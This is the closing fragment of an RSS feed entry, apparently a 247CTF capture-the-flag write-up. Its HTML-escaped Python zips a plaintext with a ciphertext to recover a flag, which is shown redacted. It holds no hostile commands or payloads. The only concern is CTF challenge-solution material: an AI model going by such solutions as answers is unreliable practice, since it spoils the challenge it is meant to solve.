class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;zip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;plain&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;40&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cipher&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;40&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Out&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;247CTF&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And the flag!&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>
